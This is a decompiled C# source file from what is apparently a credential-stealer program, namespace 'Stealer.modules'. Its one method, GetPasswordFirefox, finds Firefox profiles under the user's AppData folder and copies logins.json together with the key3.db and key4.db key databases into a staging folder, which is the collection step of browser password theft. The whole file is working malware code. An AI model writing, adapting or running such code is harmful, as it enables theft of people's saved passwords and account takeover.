using System;
using System.IO;

namespace Stealer.modules
{
	// Token: 0x02000021 RID: 33
	internal class FireFox
	{
		// Token: 0x060000AA RID: 170 RVA: 0x00008E1C File Offset: 0x0000701C
		public static void GetPasswordFirefox()
		{
			string str = Program.path + "\\";
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles\\";
			string[] files = Directory.GetFiles(path, "logins.json", SearchOption.AllDirectories);
			if (files != null)
			{
				foreach (string path2 in files)
				{
					if (!Directory.Exists(str + "FireFox"))
					{
						Directory.CreateDirectory(str + "FireFox");
					}
					string directoryName = Path.GetDirectoryName(path2);
					if (File.Exists(directoryName + "\\key3.db"))
					{
						File.Copy(directoryName + "\\key3.db", str + "FireFox\\key3.db");
					}
					if (File.Exists(directoryName + "\\key4.db"))
					{
						File.Copy(directoryName + "\\key4.db", str + "FireFox\\key4.db");
					}
					File.Copy(directoryName + "\\logins.json", str + "FireFox\\logins.json");
				}
			}
		}
	}
}
